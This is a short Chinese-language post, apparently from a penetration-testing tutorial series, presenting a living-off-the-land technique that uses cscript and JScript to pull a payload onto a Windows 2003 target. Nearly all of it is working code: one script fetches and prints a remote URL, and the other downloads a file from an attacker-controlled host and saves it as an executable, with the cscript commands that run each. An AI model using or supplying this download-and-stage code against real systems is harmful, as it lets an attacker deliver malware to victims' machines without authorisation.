windows 全版本都会默认支持 js，并且通过cscript 来调用达到下载 payload 的目的。

**靶机：**windows 2003  

### 读取：
```bash
C:\test>cscript /nologo downfile.js http://192.168.1.115/robots.txt
```  
![](media/ac794b7eb3758d954dbf95912895dd41.jpg)

### 附代码：
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
WScript.Echo(WinHttpReq.ResponseText);
```
### 写入：
```bash
C:\test>cscript /nologo dowfile2.js http://192.168.1.115/robots.txt
```

![](media/21081f49afc31e94235293e3337967b7.jpg)

### 附代码：
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();

BinStream = new ActiveXObject("ADODB.Stream"); BinStream.Type = 1;

BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile("micropoor.exe");
```

>后者的话：简单，易用，轻便。
>
>   Micropoor
